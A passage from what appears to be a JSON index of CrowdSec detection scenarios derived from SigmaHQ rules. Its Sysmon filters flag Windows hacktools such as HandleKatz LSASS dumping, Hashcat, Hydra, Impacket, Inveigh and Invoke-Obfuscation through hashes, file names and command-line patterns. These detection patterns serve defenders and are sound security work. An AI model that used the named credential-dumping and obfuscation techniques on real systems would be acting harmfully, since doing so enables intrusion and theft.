'IMPHASH=5834ED4291BDEB928270428EBBAF7604' || evt.Parsed.Hashes contains 'IMPHASH=5A8A8A43F25485E7EE1B201EDCBC7A38' || evt.Parsed.Hashes contains 'IMPHASH=DC7D30B90B2D8ABF664FBED2B1B59894' || evt.Parsed.Hashes contains 'IMPHASH=41923EA1F824FE63EA5BEB84DB7A3E74' || evt.Parsed.Hashes contains 'IMPHASH=3DE09703C8E79ED2CA3F01074719906B' || evt.Parsed.Hashes contains 'IMPHASH=A53A02B997935FD8EEDCB5F7ABAB9B9F' || evt.Parsed.Hashes contains 'IMPHASH=E96A73C7BF33A464C510EDE582318BF2' || evt.Parsed.Hashes contains 'IMPHASH=32089B8851BBF8BC2D014E9F37288C83' || evt.Parsed.Hashes contains 'IMPHASH=09D278F9DE118EF09163C6140255C690' || evt.Parsed.Hashes contains 'IMPHASH=03866661686829d806989e2fc5a72606' || evt.Parsed.Hashes contains 'IMPHASH=e57401fbdadcd4571ff385ab82bd5d6d' || evt.Parsed.Hashes contains 'IMPHASH=84B763C45C0E4A3E7CA5548C710DB4EE' || evt.Parsed.Hashes contains 'IMPHASH=19584675D94829987952432E018D5056' || evt.Parsed.Hashes contains 'IMPHASH=330768A4F172E10ACB6287B87289D83B' || evt.Parsed.Hashes contains 'IMPHASH=885C99CCFBE77D1CBFCB9C4E7C1A3313' || evt.Parsed.Hashes contains 'IMPHASH=22A22BC9E4E0D2F189F1EA01748816AC' || evt.Parsed.Hashes contains 'IMPHASH=7FA30E6BB7E8E8A69155636E50BF1B28' || evt.Parsed.Hashes contains 'IMPHASH=96DF3A3731912449521F6F8D183279B1' || evt.Parsed.Hashes contains 'IMPHASH=7E6CF3FF4576581271AC8A313B2AAB46' || evt.Parsed.Hashes contains 'IMPHASH=51791678F351C03A0EB4E2A7B05C6E17' || evt.Parsed.Hashes contains 'IMPHASH=25CE42B079282632708FC846129E98A5' || evt.Parsed.Hashes contains 'IMPHASH=021BCCA20BA3381B11BDDE26B4E62F20' || evt.Parsed.Hashes contains 'IMPHASH=59223B5F52D8799D38E0754855CBDF42' || evt.Parsed.Hashes contains 'IMPHASH=81E75D8F1D276C156653D3D8813E4A43' || evt.Parsed.Hashes contains 'IMPHASH=17244E8B6B8227E57FE709CCAD421420' || evt.Parsed.Hashes contains 'IMPHASH=5B76DA3ACDEDC8A5CDF23A798B5936B4' || evt.Parsed.Hashes contains 'IMPHASH=CB2B65BB77D995CC1C0E5DF1C860133C' || evt.Parsed.Hashes contains 'IMPHASH=40445337761D80CF465136FAFB1F63E6' || evt.Parsed.Hashes contains 'IMPHASH=8A790F401B29FA87BC1E56F7272B3AA6' || evt.Parsed.Hashes contains 'IMPHASH=B50199E952C875241B9CE06C971CE3C1')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1588.002\n   - attack.t1003\n\n  label: \"Hacktool Execution - Imphash\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of different Windows based hacktools via their import hash (imphash) even if the files have been renamed\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_execution_via_imphashes.yml", "version": "0.2", "versions": {"0.1": {"digest": "cedf74c8dad5f3e0bf589016fad5dad5547f643d326cf6ec2c53e31fec049a53"}, "0.2": {"digest": "a835d16c5b412f36a075780556a6b0206662154dfeb788d8b8a3715a658f7a05"}}}, "sigmahq/proc_creation_win_hktl_execution_via_pe_metadata": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_execution_via_pe_metadata\ndescription: |\n  Detects the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Company == 'Cube0x0')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1588.002\n   - attack.t1003\n\n  label: \"Hacktool Execution - PE Metadata\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_execution_via_pe_metadata.yml", "version": "0.2", "versions": {"0.1": {"digest": "16ec6552bfdf5029b63bd45e0fc50372e43a1360017809ea205f1977928050ff"}, "0.2": {"digest": "3d4d187a575f9ce83f9e18b7957151d931d510d55b47f4affca8d9898db4da0a"}}}, "sigmahq/proc_creation_win_hktl_gmer": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_gmer\ndescription: |\n  Detects the execution GMER tool based on image and hash fields.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\gmer.exe' || evt.Parsed.Hashes contains 'MD5=E9DC058440D321AA17D0600B3CA0AB04' || evt.Parsed.Hashes contains 'SHA1=539C228B6B332F5AA523E5CE358C16647D8BBE57' || evt.Parsed.Hashes contains 'SHA256=E8A3E804A96C716A3E9B69195DB6FFB0D33E2433AF871E4D4E1EAB3097237173' || evt.Parsed.md5 == 'e9dc058440d321aa17d0600b3ca0ab04' || evt.Parsed.sha1 == '539c228b6b332f5aa523e5ce358c16647d8bbe57' || evt.Parsed.sha256 == 'e8a3e804a96c716a3e9b69195db6ffb0d33e2433af871e4d4e1eab3097237173')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"HackTool - GMER Rootkit Detector and Remover Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution GMER tool based on image and hash fields.\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_gmer.yml", "version": "0.2", "versions": {"0.1": {"digest": "cb70299ae375a4350ce3f28756c808cb109917cf9b39596dfa8b776181613d8c"}, "0.2": {"digest": "6dc3cb3a5c3fd6e1b069835cf38336ff8a48cff23a8e578b01b55dd99c78cfec"}}}, "sigmahq/proc_creation_win_hktl_handlekatz": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_handlekatz\ndescription: |\n  Detects the use of HandleKatz, a tool that demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\loader.exe' && evt.Parsed.CommandLine contains '--pid:' || evt.Parsed.Imphash in ['38d9e015591bbfd4929e0d0f47fa0055', '0e2216679ca6e1094d63322e3412d650'] || evt.Parsed.Hashes contains 'IMPHASH=38D9E015591BBFD4929E0D0F47FA0055' || evt.Parsed.Hashes contains 'IMPHASH=0E2216679CA6E1094D63322E3412D650' || evt.Parsed.CommandLine contains '--pid:' && evt.Parsed.CommandLine contains '--outfile:' && (evt.Parsed.CommandLine contains '.dmp' || evt.Parsed.CommandLine contains 'lsass' || evt.Parsed.CommandLine contains '.obf' || evt.Parsed.CommandLine contains 'dump'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - HandleKatz LSASS Dumper Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of HandleKatz, a tool that demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_handlekatz.yml", "version": "0.2", "versions": {"0.1": {"digest": "969ec62551a6875f816abe8e1797df4a9852b3879c0f9fc273a172899b1d685b"}, "0.2": {"digest": "dcb9f3dfe771fceea472a56e33464101d13cf78bd2c129d829efca0e8477a657"}}}, "sigmahq/proc_creation_win_hktl_hashcat": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_hashcat\ndescription: |\n  Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\hashcat.exe' || evt.Parsed.CommandLine contains '-a ' && evt.Parsed.CommandLine contains '-m 1000 ' && evt.Parsed.CommandLine contains '-r ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1110.002\n\n  label: \"HackTool - Hashcat Password Cracker Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_hashcat.yml", "version": "0.2", "versions": {"0.1": {"digest": "909734bd215841850111fd383e5d24c6d1df16c1d3b86e60abe68f70cd6caaaf"}, "0.2": {"digest": "d9fc6e684232fbfc47d71c854b6ef7c57fcf8e326123c2c67a1a7caed2a5cdd9"}}}, "sigmahq/proc_creation_win_hktl_htran_or_natbypass": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_htran_or_natbypass\ndescription: |\n  Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\htran.exe' || evt.Parsed.Image endsWith '\\\\lcx.exe' || evt.Parsed.CommandLine contains '.exe -tran ' || evt.Parsed.CommandLine contains '.exe -slave ')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1090\n\n  label: \"HackTool - Htran/NATBypass Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_htran_or_natbypass.yml", "version": "0.2", "versions": {"0.1": {"digest": "4ae39a02ade332d531aea0546f740f7bfb645ec4d40e2831f65b5ab5ac02343a"}, "0.2": {"digest": "aa7349848a2eea845139b1035c315be744df3ec37e315bb0bc916b662e919910"}}}, "sigmahq/proc_creation_win_hktl_hydra": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_hydra\ndescription: |\n  Detects command line parameters used by Hydra password guessing hack tool\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '-u ' && evt.Parsed.CommandLine contains '-p ' && (evt.Parsed.CommandLine contains '^USER^' || evt.Parsed.CommandLine contains '^PASS^'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1110\n   - attack.t1110.001\n\n  label: \"HackTool - Hydra Password Bruteforce Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command line parameters used by Hydra password guessing hack tool\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_hydra.yml", "version": "0.2", "versions": {"0.1": {"digest": "8b89a944b4e8cf931088456ff61863880ad467ccfc8f265736629b6310c823a7"}, "0.2": {"digest": "0009dafd8aab825950767bf2438724c94b19ba03a27a7b3a61d395f4f34da59e"}}}, "sigmahq/proc_creation_win_hktl_impacket_lateral_movement": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_impacket_lateral_movement\ndescription: |\n  Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\wmiprvse.exe' || evt.Parsed.ParentImage endsWith '\\\\mmc.exe' || evt.Parsed.ParentImage endsWith '\\\\explorer.exe' || evt.Parsed.ParentImage endsWith '\\\\services.exe') && evt.Parsed.CommandLine contains 'cmd.exe' && evt.Parsed.CommandLine contains '/Q' && evt.Parsed.CommandLine contains '/c' && evt.Parsed.CommandLine contains '\\\\\\\\127.0.0.1\\\\' && evt.Parsed.CommandLine contains '&1' || (evt.Parsed.ParentCommandLine contains 'svchost.exe -k netsvcs' || evt.Parsed.ParentCommandLine contains 'taskeng.exe') && evt.Parsed.CommandLine contains 'cmd.exe' && evt.Parsed.CommandLine contains '/C' && evt.Parsed.CommandLine contains 'Windows\\\\Temp\\\\' && evt.Parsed.CommandLine contains '&1')\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1047\n   - attack.t1021.003\n\n  label: \"HackTool - Potential Impacket Lateral Movement Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_impacket_lateral_movement.yml", "version": "0.2", "versions": {"0.1": {"digest": "cbf24796e47c4c22e12b31239f96adf887bfad6229eadc83e1c74f6b87dd54bd"}, "0.2": {"digest": "b9f862af3fe0ae06fb945752fde698f116562311436d6dd8a938eca918fc4f07"}}}, "sigmahq/proc_creation_win_hktl_impacket_tools": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_impacket_tools\ndescription: |\n  Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image contains '\\\\goldenPac' || evt.Parsed.Image contains '\\\\karmaSMB' || evt.Parsed.Image contains '\\\\kintercept' || evt.Parsed.Image contains '\\\\ntlmrelayx' || evt.Parsed.Image contains '\\\\rpcdump' || evt.Parsed.Image contains '\\\\samrdump' || evt.Parsed.Image contains '\\\\secretsdump' || evt.Parsed.Image contains '\\\\smbexec' || evt.Parsed.Image contains '\\\\smbrelayx' || evt.Parsed.Image contains '\\\\wmiexec' || evt.Parsed.Image contains '\\\\wmipersist' || evt.Parsed.Image endsWith '\\\\atexec_windows.exe' || evt.Parsed.Image endsWith '\\\\dcomexec_windows.exe' || evt.Parsed.Image endsWith '\\\\dpapi_windows.exe' || evt.Parsed.Image endsWith '\\\\findDelegation_windows.exe' || evt.Parsed.Image endsWith '\\\\GetADUsers_windows.exe' || evt.Parsed.Image endsWith '\\\\GetNPUsers_windows.exe' || evt.Parsed.Image endsWith '\\\\getPac_windows.exe' || evt.Parsed.Image endsWith '\\\\getST_windows.exe' || evt.Parsed.Image endsWith '\\\\getTGT_windows.exe' || evt.Parsed.Image endsWith '\\\\GetUserSPNs_windows.exe' || evt.Parsed.Image endsWith '\\\\ifmap_windows.exe' || evt.Parsed.Image endsWith '\\\\mimikatz_windows.exe' || evt.Parsed.Image endsWith '\\\\netview_windows.exe' || evt.Parsed.Image endsWith '\\\\nmapAnswerMachine_windows.exe' || evt.Parsed.Image endsWith '\\\\opdump_windows.exe' || evt.Parsed.Image endsWith '\\\\psexec_windows.exe' || evt.Parsed.Image endsWith '\\\\rdp_check_windows.exe' || evt.Parsed.Image endsWith '\\\\sambaPipe_windows.exe' || evt.Parsed.Image endsWith '\\\\smbclient_windows.exe' || evt.Parsed.Image endsWith '\\\\smbserver_windows.exe' || evt.Parsed.Image endsWith '\\\\sniff_windows.exe' || evt.Parsed.Image endsWith '\\\\sniffer_windows.exe' || evt.Parsed.Image endsWith '\\\\split_windows.exe' || evt.Parsed.Image endsWith '\\\\ticketer_windows.exe')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1557.001\n\n  label: \"HackTool - Impacket Tools Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_impacket_tools.yml", "version": "0.2", "versions": {"0.1": {"digest": "d2023150e5ab15aac9886db03692949a870aba20a078fcd600e0ed780eaa057b"}, "0.2": {"digest": "e0fe25e474de6637d34d2ddbad8cab48587ff9486e788d728f6b05fe1a4f0a1c"}}}, "sigmahq/proc_creation_win_hktl_inveigh": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_inveigh\ndescription: |\n  Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\Inveigh.exe' || evt.Parsed.OriginalFileName in ['\\\\Inveigh.exe', '\\\\Inveigh.dll'] || evt.Parsed.Description == 'Inveigh' || evt.Parsed.CommandLine contains ' -SpooferIP' || evt.Parsed.CommandLine contains ' -ReplyToIPs ' || evt.Parsed.CommandLine contains ' -ReplyToDomains ' || evt.Parsed.CommandLine contains ' -ReplyToMACs ' || evt.Parsed.CommandLine contains ' -SnifferIP')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"HackTool - Inveigh Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of Inveigh a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_inveigh.yml", "version": "0.2", "versions": {"0.1": {"digest": "dfe3e9d7ef6ab85e3bc252f362160edc11f4b5928016065ab4c2b35816118b0f"}, "0.2": {"digest": "e3c00264b54ef971434eeb08103eddebe64bb8c358946eb304949bc310897a36"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_clip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_clip\ndescription: |\n  Detects Obfuscated use of Clip.exe to execute PowerShell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'cmd' && evt.Parsed.CommandLine contains '&&' && evt.Parsed.CommandLine contains 'clipboard]::' && evt.Parsed.CommandLine contains '-f' && (evt.Parsed.CommandLine contains '/c' || evt.Parsed.CommandLine contains '/r'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation CLIP+ Launcher\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated use of Clip.exe to execute PowerShell\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_clip.yml", "version": "0.2", "versions": {"0.1": {"digest": "359e4bc53b24f97454103b2764bb980e692e42b8249b40e83fe2dfdd992e0a47"}, "0.2": {"digest": "334a9f2c4292235e0f790483d7f95fefe720d02e4b7b0c5eafb7364936e8aec2"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline\ndescription: |\n  Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine matches '\\\\$PSHome\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$PSHome\\\\[' || evt.Parsed.CommandLine matches '\\\\$ShellId\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$ShellId\\\\[' || evt.Parsed.CommandLine matches '\\\\$env:Public\\\\[\\\\s*\\\\d{1,3}\\\\s*\\\\]\\\\s*\\\\+\\\\s*\\\\$env:Public\\\\[' || evt.Parsed.CommandLine matches '\\\\$env:ComSpec\\\\[(\\\\s*\\\\d{1,3}\\\\s*,){2}' || evt.Parsed.CommandLine matches '\\\\*mdr\\\\*\\\\W\\\\s*\\\\)\\\\.Name' || evt.Parsed.CommandLine matches '\\\\$VerbosePreference\\\\.ToString\\\\(' || evt.Parsed.CommandLine matches '\\\\[String\\\\]\\\\s*\\\\$VerbosePreference')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation Obfuscated IEX Invocation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline.yml", "version": "0.2", "versions": {"0.1": {"digest": "a79ec544174108f3f1335d2a4e68436dbefbbed3fa7a5d104d884b79fd9db03a"}, "0.2": {"digest": "c998469cad0953e61f08cec98d0d02b26be784732b7604ac218d894d22de6248"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_stdin": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_stdin\ndescription: |\n  Detects Obfuscated use of stdin to execute PowerShell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine matches 'cmd.{0,5}(?:/c|/r).+powershell.+(?:\\\\$\\\\{?input\\\\}?|noexit).+\\\\\"')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation STDIN+ Launcher\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated use of stdin to execute PowerShell\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_stdin.yml", "version": "0.2", "versions": {"0.1": {"digest": "bd846a78bf694a40b86b11cfc354c25fa5a3401ca6c489fb7468a15c831f6c4f"}, "0.2": {"digest": "9e277c88141abb58ba85b8e0dc200d6066e13189a8dbf3054fe089d1c6c3136d"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_var": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_var\ndescription: |\n  Detects Obfuscated use of Environment Variables to execute PowerShell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine matches 'cmd.{0,5}(?:/c|/r)(?:\\\\s|)\\\\\"set\\\\s[a-zA-Z]{3,6}.*(?:\\\\{\\\\d\\\\}){1,}\\\\\\\\\\\\\"\\\\s+?\\\\-f(?:.*\\\\)){1,}.*\\\\\"')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation VAR+ Launcher\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated use of Environment Variables to execute PowerShell\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_var.yml", "version": "0.2", "versions": {"0.1": {"digest": "8d6ce4cf047dbd08b78228b5eb3c9c4c82f6ebdcd0a86f049c33e059b98398d7"}, "0.2": {"digest": "b86a19abf1554d3e621ffa69b5d7f4ceda3205e180ef88bf6577baf5fb71d83b"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_stdin": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_stdin\ndescription: |\n  Detects Obfuscated Powershell via Stdin in Scripts\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine matches '(?i)(set).*&&\\\\s?set.*(environment|invoke|\\\\$\\\\{?input).*&&.*\"')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation Via Stdin\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated Powershell via Stdin in Scripts\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_stdin.yml", "version": "0.2", "versions": {"0.1": {"digest": "94879a5eb0a1fbe501a2b14be551c5a52663df7b8254c790e7da5ecd4081e8bf"}, "0.2": {"digest": "e21559d25e19af2c9d547f78ba154f141a5f5cebb1b4d802b7806755742962ae"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_clip": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_clip\ndescription: |\n  Detects Obfuscated Powershell via use Clip.exe in Scripts\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine matches '(?i)echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?)')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation Via Use Clip\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_clip.yml", "version": "0.2", "versions": {"0.1": {"digest": "d7229c2cfe704c681abd68fe96ac5bf71d8726d193976c02a58c810aa4e3b19d"}, "0.2": {"digest": "2db920d9e98afb8bbd82b2ba4591d281b72d56a9bb1c19687e531e6ebc9a722f"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta\ndescription: |\n  Detects Obfuscated Powershell via use MSHTA in Scripts\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'set' && evt.Parsed.CommandLine contains '&&' && evt.Parsed.CommandLine contains 'mshta' && evt.Parsed.CommandLine contains 'vbscript:createobject' && evt.Parsed.CommandLine contains '.run' && evt.Parsed.CommandLine contains '(window.close)')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation Via Use MSHTA\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated Powershell via use MSHTA in Scripts\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_use_mhsta.yml", "version": "0.2", "versions": {"0.1": {"digest": "cbdbf783fdc1c47cfdd5ec0f0eec66422372a3ea6ca7b0ad5c8c8b22ead89df4"}, "0.2": {"digest": "b868ab6e7b93bfb235e4a180ea378b687edb271e0849edee5e760fb2cac34423"}}}, "sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_var": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_var\ndescription: |\n  Detects Obfuscated Powershell via VAR++ LAUNCHER\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '&&set' && evt.Parsed.CommandLine contains 'cmd' && evt.Parsed.CommandLine contains '/c' && evt.Parsed.CommandLine contains '-f' && (evt.Parsed.CommandLine contains '{0}' || evt.Parsed.CommandLine contains '{1}' || evt.Parsed.CommandLine contains '{2}' || evt.Parsed.CommandLine contains '{3}' || evt.Parsed.CommandLine contains '{4}' || evt.Parsed.CommandLine contains '{5}'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER\n", "path": "scenarios/sigmahq/proc_creation_win_hktl_invoke_obfuscation_via_var.yml", "version": "0.2", "versions": {"0.1": {"digest": "1c4f5158887bccf42fac921f55a622df9c0ef6a3d800d82943fba0f5143eebb0"}, "0.2": {"digest": "9c5ff9218a7fc177d80c2bc39c9ca5f0ee349192636f11ac2908d97f0cb4a08d"}}}, "sigmahq/proc_creation_win_hktl_koadic": {"content": "type: trigger\nname: sigmahq/proc_creation_win_hktl_koadic\ndescription: |\n  Detects command line parameters used by Koadic hack tool\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.OriginalFileName == 'Cmd.Exe') && evt.Parsed.CommandLine contains 